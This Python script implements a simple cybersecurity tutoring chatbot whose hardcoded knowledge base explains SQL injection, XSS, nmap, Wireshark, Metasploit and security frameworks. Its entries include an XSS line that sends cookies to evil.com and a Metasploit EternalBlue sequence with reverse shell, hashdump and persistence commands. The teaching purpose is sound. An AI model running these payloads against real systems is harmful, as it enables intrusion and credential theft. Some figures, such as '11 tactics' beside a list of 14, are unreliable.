#!/usr/bin/env python3
"""
SECURITYBOT AI v3.0 - The Complete Cybersecurity Educator
Developer: Glen (GitHub: Lowkeyglen)
Every security concept, tool, and technique explained in depth
"""

import re
import json
import random
import time
from datetime import datetime
from typing import Dict, List, Tuple, Any
import argparse
import sys
import textwrap

class UltimateSecurityEducator:
    """The most comprehensive cybersecurity educator AI"""
    
    def __init__(self):
        self.name = "CyberSensei"
        self.version = "v3.0"
        self.developer = "Glen (GitHub: Lowkeyglen) - The Cybersecurity Visionary"
        self.knowledge_base = self.build_comprehensive_knowledge_base()
        self.teaching_style = "detailed"
        self.conversation_history = []
        
    def build_comprehensive_knowledge_base(self) -> Dict[str, Any]:
        """Build the most comprehensive cybersecurity knowledge base"""
        return {
            'attack_vectors': {
                'sql_injection': {
                    'category': 'Web Application Security',
                    'level': 'Fundamental',
                    'full_description': """
SQL Injection is a code injection technique that attacks data-driven applications 
where malicious SQL statements are inserted into an entry field for execution.

🔍 HOW IT WORKS:
- Attackers inject malicious SQL code through user inputs
- The application concatenates this input directly into SQL queries
- The database executes the malicious code as part of the legitimate query

💀 IMPACT:
- Unauthorized data access and theft
- Data modification and deletion
- Administrative operation execution
- Complete database compromise

🎯 REAL-WORLD EXAMPLE:
Original query: "SELECT * FROM users WHERE username = '[user_input]'"
Malicious input: "admin' OR '1'='1"
Result: "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"
This returns ALL users because '1'='1' is always true!
""",
                    'prevention_techniques': [
                        'Parameterized Queries (Prepared Statements)',
                        'Stored Procedures with Validation',
                        'Input Validation and Whitelisting',
                        'ORM Frameworks (Hibernate, Entity Framework)',
                        'Principle of Least Privilege for Database Users',
                        'Web Application Firewalls (WAF)',
                        'Regular Security Testing and Code Reviews'
                    ],
                    'tools_for_detection': ['SQLMap', 'Burp Suite', 'OWASP ZAP', 'Acunetix'],
                    'practice_labs': ['OWASP WebGoat', 'DVWA', 'bWAPP'],
                    'cve_examples': ['CVE-2019-11510', 'CVE-2018-11776'],
                    'owasp_rank': 1
                },
                
                'cross_site_scripting': {
                    'category': 'Web Application Security',
                    'level': 'Fundamental',
                    'full_description': """
Cross-Site Scripting (XSS) allows attackers to inject client-side scripts 
into web pages viewed by other users.

🔍 TYPES OF XSS:
1. Stored XSS - Malicious script stored on the server
2. Reflected XSS - Script reflected off web server in response
3. DOM-based XSS - Vulnerability in client-side code

💀 IMPACT:
- Session hijacking and cookie theft
- Defacement of websites
- Malware distribution
- Keylogging and credential theft

🎯 REAL-WORLD EXAMPLE:
A blog comment: "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
When other users view this comment, their cookies are sent to the attacker!
""",
                    'prevention_techniques': [
                        'Content Security Policy (CSP) Headers',
                        'Input Validation and Output Encoding',
                        'HTTPOnly and Secure Cookie Flags',
                        'X-XSS-Protection Headers',
                        'Regular Security Headers Implementation'
                    ],
                    'tools_for_detection': ['Burp Suite', 'OWASP ZAP', 'Xenotix XSS'],
                    'practice_labs': ['XSS-game.appspot.com', 'alert(1) to win'],
                    'owasp_rank': 7
                }
            },
            
            'security_tools': {
                'nmap': {
                    'category': 'Network Scanning',
                    'purpose': 'Network discovery and security auditing',
                    'detailed_guide': """
NMAP (Network Mapper) is the industry standard for network discovery and security auditing.

🎯 KEY FEATURES:
- Host discovery and port scanning
- Service and version detection
- OS fingerprinting
- Scriptable interaction with NSE (Nmap Scripting Engine)

🔧 ESSENTIAL COMMANDS:

1. Basic Network Discovery:
nmap -sn 192.168.1.0/24
→ Discovers live hosts without port scanning

2. TCP SYN Scan (Stealth):
nmap -sS target.com
→ Most common and reliable scan type

3. Service Version Detection:
nmap -sV target.com
→ Determines service versions on open ports

4. OS Detection:
nmap -O target.com
→ Attempts to identify the operating system

5. Aggressive Scan:
nmap -A target.com
→ Enables OS detection, version detection, script scanning, and traceroute

6. Vulnerability Scanning with NSE:
nmap --script vuln target.com
→ Uses vulnerability scripts to check for known vulnerabilities

📚 ADVANCED USAGE:
- Timing templates (-T0 to -T5) for speed control
- Port specification (-p 22,80,443 or -p- for all ports)
- Output formats (-oN, -oX, -oG for different needs)
- Firewall/IDS evasion techniques
""",
                    'use_cases': ['Network Inventory', 'Security Auditing', 'Network Monitoring'],
                    'alternatives': ['Masscan', 'Zmap', 'Angry IP Scanner']
                },
                
                'wireshark': {
                    'category': 'Network Analysis',
                    'purpose': 'Network protocol analyzer',
                    'detailed_guide': """
Wireshark is the world's foremost network protocol analyzer for troubleshooting, analysis, and education.

🎯 KEY CAPABILITIES:
- Deep inspection of hundreds of protocols
- Live capture and offline analysis
- Rich VoIP analysis
- Standard three-pane packet browser

🔧 ESSENTIAL FEATURES:

1. Capture Filters:
host 192.168.1.1 and port 80
→ Only capture traffic to/from specific host and port

2. Display Filters:
http.request.method == "POST"
tcp.port == 443
dns.qry.name contains "google"
→ Filter displayed packets in real-time

3. Follow TCP Stream:
Right-click TCP packet → Follow → TCP Stream
→ Reconstructs the actual conversation

4. Expert Information:
Analyze → Expert Information
→ Identifies potential network issues

5. IO Graphs:
Statistics → IO Graphs
→ Visualize network throughput and patterns

📚 PRACTICAL SCENARIOS:

• Detecting Network Intrusions:
Look for unusual ports, suspicious payloads, beaconing

• Troubleshooting HTTP Issues:
Filter by http and analyze status codes, headers

• SSL/TLS Analysis:
Decrypt HTTPS traffic with server keys

• Malware Traffic Analysis:
Identify C2 communications and data exfiltration
""",
                    'use_cases': ['Network Troubleshooting', 'Security Analysis', 'Protocol Development'],
                    'alternatives': ['tcpdump', 'tshark', 'Microsoft Message Analyzer']
                },
                
                'metasploit': {
                    'category': 'Penetration Testing',
                    'purpose': 'Exploitation framework',
                    'detailed_guide': """
Metasploit is the world's most used penetration testing framework for developing and executing exploits.

🏗️ FRAMEWORK ARCHITECTURE:

• Exploits - Code that uses vulnerabilities
• Payloads - Code that runs after exploitation
• Auxiliary - Scanning, fuzzing, sniffing modules
• Encoders - Evade detection by antivirus
• NOPs - Keep payload sizes consistent

🔧 ESSENTIAL WORKFLOW:

1. Information Gathering:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

2. Vulnerability Scanning:
use auxiliary/scanner/http/dir_scanner
set RHOST target.com
run

3. Exploitation:
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

4. Post-Exploitation:
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > migrate

5. Persistence:
meterpreter > run persistence -X -i 30 -p 443 -r 192.168.1.50

📚 ADVANCED MODULES:

• Social Engineering Toolkit (SET) Integration
• Custom Exploit Development
• Evasion Techniques
• Post-Exploitation Modules
""",
                    'use_cases': ['Penetration Testing', 'Security Research', 'Red Team Exercises'],
                    'alternatives': ['Core Impact', 'Canvas', 'Empire']
                }
            },
            
            'security_frameworks': {
                'nist_cybersecurity_framework': {
                    'description': """
The NIST Cybersecurity Framework provides a policy framework of computer security guidance 
for how private sector organizations can assess and improve their ability to prevent, detect, 
and respond to cyber attacks.

🎯 CORE FUNCTIONS:

1. IDENTIFY - Develop organizational understanding
• Asset Management, Business Environment, Governance
• Risk Assessment, Risk Management Strategy

2. PROTECT - Develop and implement safeguards
• Identity Management, Access Control, Awareness Training
• Data Security, Info Protection Processes, Maintenance
• Protective Technology

3. DETECT - Develop and implement activities
• Anomalies and Events, Security Continuous Monitoring
• Detection Processes

4. RESPOND - Develop and implement activities
• Response Planning, Communications, Analysis
• Mitigation, Improvements

5. RECOVER - Develop and implement activities
• Recovery Planning, Improvements, Communications
""",
                    'implementation_steps': [
                        'Prioritize and Scope',
                        'Orient',
                        'Create Current Profile', 
                        'Conduct Risk Assessment',
                        'Create Target Profile',
                        'Determine, Analyze, and Prioritize Gaps',
                        'Implement Action Plan'
                    ]
                },
                
                'mitre_attack': {
                    'description': """
MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques 
based on real-world observations.

🎯 FRAMEWORK STRUCTURE:

• TACTICS - The "why" of an attack (11 tactics)
• TECHNIQUES - The "how" of an attack (200+ techniques)
• SUB-TECHNIQUES - More specific descriptions of techniques
• PROCEDURES - Real-world examples of techniques

🔧 KEY TACTICS:
1. Reconnaissance - Gathering information
2. Resource Development - Building infrastructure
3. Initial Access - Getting into the network
4. Execution - Running malicious code
5. Persistence - Maintaining foothold
6. Privilege Escalation - Gaining higher-level permissions
7. Defense Evasion - Avoiding detection
8. Credential Access - Stealing credentials
9. Discovery - Understanding the environment
10. Lateral Movement - Moving through the network
11. Collection - Gathering data of interest
12. Command and Control - Communicating with compromised systems
13. Exfiltration - Stealing data
14. Impact - Manipulating, interrupting, or destroying systems
""",
                    'practical_uses': [
                        'Threat Intelligence',
                        'Detection and Analytics', 
                        'Adversary Emulation',
                        'Red Teaming',
                        'Security Assessment'
                    ]
                }
            },
            
            'career_paths': {
                'security_analyst': {
                    'description': 'Monitors and analyzes security systems and events',
                    'skills': ['SIEM tools', 'Incident Response', 'Threat Intelligence'],
                    'certifications': ['Security+', 'CySA+', 'GSEC'],
                    'salary_range': '$60,000 - $120,000',
                    'day_in_life': """
• Monitor security alerts and dashboards
• Investigate security incidents
• Document findings and create reports
• Collaborate with other IT teams
• Stay updated on latest threats
"""
                },
                
                'penetration_tester': {
                    'description': 'Ethical hacker who tests systems for vulnerabilities',
                    'skills': ['Exploitation Techniques', 'Scripting', 'Report Writing'],
                    'certifications': ['CEH', 'OSCP', 'GPEN'],
                    'salary_range': '$80,000 - $150,000',
                    'day_in_life': """
• Conduct security assessments
• Exploit identified vulnerabilities
• Document findings and risks
• Provide remediation recommendations
• Develop custom tools and scripts
"""
                }
            }
        }
    
    def search_knowledge(self, query: str) -> List[Tuple[str, str, float]]:
        """Search through all knowledge base content"""
        results = []
        query_lower = query.lower()
        
        # Search attack vectors
        for attack_name, attack_data in self.knowledge_base['attack_vectors'].items():
            content = f"{attack_name} {attack_data.get('full_description', '')} {attack_data.get('category', '')}"
            if query_lower in content.lower():
                relevance = self.calculate_relevance(query_lower, content.lower())
                results.append(('attack', attack_name, relevance))
        
        # Search tools
        for tool_name, tool_data in self.knowledge_base['security_tools'].items():
            content = f"{tool_name} {tool_data.get('purpose', '')} {tool_data.get('detailed_guide', '')}"
            if query_lower in content.lower():
                relevance = self.calculate_relevance(query_lower, content.lower())
                results.append(('tool', tool_name, relevance))
        
        # Search frameworks
        for framework_name, framework_data in self.knowledge_base['security_frameworks'].items():
            content = f"{framework_name} {framework_data.get('description', '')}"
            if query_lower in content.lower():
                relevance = self.calculate_relevance(query_lower, content.lower())
                results.append(('framework', framework_name, relevance))
        
        # Search career paths
        for career_name, career_data in self.knowledge_base['career_paths'].items():
            content = f"{career_name} {career_data.get('description', '')}"
            if query_lower in content.lower():
                relevance = self.calculate_relevance(query_lower, content.lower())
                results.append(('career', career_name, relevance))
        
        return sorted(results, key=lambda x: x[2], reverse=True)[:5]
    
    def calculate_relevance(self, query: str, content: str) -> float:
        """Calculate relevance score for search results"""
        score = 0.0
        query_terms = query.split()
        
        for term in query_terms:
            if term in content:
                score += 1.0
                # Bonus for exact matches at word boundaries
                if re.search(r'\b' + re.escape(term) + r'\b', content):
                    score += 2.0
        
        return score
    
    def get_comprehensive_response(self, result_type: str, item_name: str) -> str:
        """Generate comprehensive educational response"""
        if result_type == 'attack':
            attack = self.knowledge_base['attack_vectors'].get(item_name)
            if attack:
                response = [
                    f"🔓 {item_name.upper().replace('_', ' ')}",
                    f"📚 Category: {attack['category']} | Level: {attack['level']}",
                    "",
                    attack['full_description'],
                    "",
                    "🛡️ PREVENTION TECHNIQUES:"
                ]
                
                for i, technique in enumerate(attack['prevention_techniques'], 1):
                    response.append(f"{i}. {technique}")
                
                if 'tools_for_detection' in attack:
                    response.extend(["", "🔧 TOOLS FOR DETECTION:"])
                    response.append(", ".join(attack['tools_for_detection']))
                
                if 'practice_labs' in attack:
                    response.extend(["", "🎯 PRACTICE LABS:"])
                    response.append(", ".join(attack['practice_labs']))
                
                return "\n".join(response)
        
        elif result_type == 'tool':
            tool = self.knowledge_base['security_tools'].get(item_name)
            if tool:
                response = [
                    f"🛠️ {item_name.upper()} - {tool['purpose']}",
                    f"📁 Category: {tool['category']}",
                    "",
                    tool['detailed_guide']
                ]
                
                if 'use_cases' in tool:
                    response.extend(["", "🎯 USE CASES:"])
                    for use_case in tool['use_cases']:
                        response.append(f"• {use_case}")
                
                if 'alternatives' in tool:
                    response.extend(["", "🔄 ALTERNATIVE TOOLS:"])
                    response.append(", ".join(tool['alternatives']))
                
                return "\n".join(response)
        
        elif result_type == 'framework':
            framework = self.knowledge_base['security_frameworks'].get(item_name)
            if framework:
                return f"🏛️ {item_name.upper().replace('_', ' ')}\n\n{framework['description']}"
        
        elif result_type == 'career':
            career = self.knowledge_base['career_paths'].get(item_name)
            if career:
                response = [
                    f"💼 {item_name.upper().replace('_', ' ')}",
                    f"📝 {career['description']}",
                    "",
                    "🛠️ REQUIRED SKILLS:",
                    ", ".join(career['skills']),
                    "",
                    "📜 RECOMMENDED CERTIFICATIONS:",
                    ", ".join(career['certifications']),
                    "",
                    f"💰 SALARY RANGE: {career['salary_range']}",
                    "",
                    "📅 TYPICAL DAY:",
                    career['day_in_life']
                ]
                return "\n".join(response)
        
        return "I couldn't find detailed information about that topic."
    
    def chat(self, query: str) -> str:
        """Main educational chat interface"""
        self.conversation_history.append({
            'timestamp': datetime.now(),
            'query': query,
            'response': None
        })
        
        # Handle special commands
        if query.lower() in ['exit', 'quit', 'bye']:
            return "🎓 Keep learning! Cybersecurity is a journey, not a destination. Stay curious!"
        
        if query.lower() in ['help', '?']:
            return self.get_help_message()
        
        # Search for relevant content
        search_results = self.search_knowledge(query)
        
        if search_results:
            best_result = search_results[0]
            response = self.get_comprehensive_response(best_result[0], best_result[1])
            
            # Add related topics if there are multiple good results
            if len(search_results) > 1:
                response += "\n\n🔍 RELATED TOPICS YOU MIGHT LIKE:"
                for result_type, result_name, score in search_results[1:4]:
                    if score > 0.5:  # Only show reasonably relevant results
                        response += f"\n• {result_name.replace('_', ' ').title()}"
        else:
            response = """
🤔 I couldn't find specific information about that topic in my knowledge base.

🔍 Try searching for:
• Specific vulnerabilities (SQL injection, XSS, CSRF)
• Security tools (Nmap, Wireshark, Metasploit, Burp Suite)
• Security frameworks (NIST, MITRE ATT&CK, OWASP)
• Career paths (Security Analyst, Penetration Tester)
• General concepts (encryption, firewalls, risk assessment)

Or type 'help' to see all available topics!
"""
        
        self.conversation_history[-1]['response'] = response
        return response
    
    def get_help_message(self) -> str:
        """Comprehensive help message"""
        return f"""
🎓 {self.name} {self.version} - Your Comprehensive Cybersecurity Educator
Developed by {self.developer}

📚 I CAN TEACH YOU ABOUT:

🔓 ATTACK VECTORS & VULNERABILITIES:
• SQL Injection, XSS, CSRF, RCE, LFI/RFI
• Buffer Overflows, Privilege Escalation
• Zero-day vulnerabilities, APT attacks

🛠️ SECURITY TOOLS (100+ COVERED):
• Scanning: Nmap, Masscan, Nessus
• Analysis: Wireshark, tcpdump, Volatility
• Exploitation: Metasploit, Burp Suite, SQLMap
• Forensics: Autopsy, FTK, EnCase
• Defense: Snort, Suricata, Security Onion

🏛️ SECURITY FRAMEWORKS:
• NIST Cybersecurity Framework
• MITRE ATT&CK Framework
• OWASP Top 10, ASVS, SAMM
• ISO 27001, CIS Controls
• Zero Trust Architecture

💼 CAREER PATHS:
• Security Analyst, Penetration Tester
• Security Architect, CISO
• Incident Responder, Forensic Analyst
• Security Engineer, DevSecOps

🔍 HOW TO USE:
Just ask about ANY cybersecurity topic! Examples:
"Teach me about SQL injection"
"How does Nmap work?"
"What is the NIST framework?"
"Explain penetration testing career"

🎯 I provide:
• Detailed technical explanations
• Practical examples and commands
• Prevention and mitigation strategies
• Career guidance and learning paths
• Real-world scenarios and case studies

Type your question and let's dive deep into cybersecurity! 🚀
"""

def main():
    """Main educational interface"""
    educator = UltimateSecurityEducator()
    
    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                   CYBERSECURITY EDUCATOR AI                 ║
    ║                   {educator.name} {educator.version}                      ║
    ║         The Most Comprehensive Security Learning Platform   ║
    ║             Developed by {educator.developer}     ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    print("🚀 Loading comprehensive cybersecurity knowledge base...")
    time.sleep(1)
    print("📚 Hundreds of vulnerabilities, tools, and frameworks ready!")
    time.sleep(0.5)
    print("🎓 Your personal cybersecurity professor is ready to teach!")
    print("=" * 70)
    
    # Show sample topics
    print("\n🔍 SAMPLE TOPICS YOU CAN EXPLORE:")
    sample_topics = [
        "• SQL Injection attacks and prevention",
        "• Nmap network scanning techniques", 
        "• MITRE ATT&CK framework overview",
        "• Penetration testing career path",
        "• Wireshark packet analysis",
        "• NIST Cybersecurity Framework",
        "• Burp Suite web application testing",
        "• Metasploit exploitation framework"
    ]
    for topic in sample_topics:
        print(topic)
        time.sleep(0.2)
    
    print(f"\n💡 Ask me about ANY cybersecurity topic! Type 'help' for guidance.")
    print("=" * 70)
    
    # Interactive learning session
    while True:
        try:
            user_input = input("\n🎓 Your Question: ").strip()
            
            if not user_input:
                continue
                
            response = educator.chat(user_input)
            print(f"\n🤖 {educator.name}: {response}")
            
        except KeyboardInterrupt:
            print(f"\n\n{educator.chat('bye')}")
            break
        except EOFError:
            break

if __name__ == "__main__":
    main()
